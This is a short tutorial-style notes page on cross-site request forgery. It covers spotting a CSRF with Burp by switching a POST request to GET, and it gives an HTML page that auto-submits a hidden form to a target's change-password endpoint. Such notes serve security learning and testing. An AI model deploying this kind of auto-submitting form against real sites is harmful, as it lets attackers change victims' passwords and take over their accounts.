---
title: Notes | Session Security
author: Zeropio
date: 2022-04-24
categories: [Notes, Vulnerabilities]
tags: [csrf, xss]
permalink: /notes/vulnerabilities/session-security
---

# Cross Site Request Forgery
**CSRF** is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.

We can test it with **Burp**. First we need to find a request to the server with **POST**. Send that to the intercept from Burp, and then to the intruder.
You should be able to see te request, right-click and change the method (from POST to GET). If you get an url with the form, you have found the CSRF.

We can try copying a form, and changing the **action="#"** with the link to the page. Then send the request and check if the server allowed it. If it's so, is a CSRF.
We can create a file similar to:
```html
<form  id ="form" action="http://<ip>/change-password/" method="GET">
    <input type="hidden" autocomplete="off" value="1234">
    <input type="hidden" autocomplete="off" value="1234">
    <input type="hidden" value="Change">
</form>

<script>document.getElementById('form').submit();</script>
```
This will change the password from the user who enter this page.
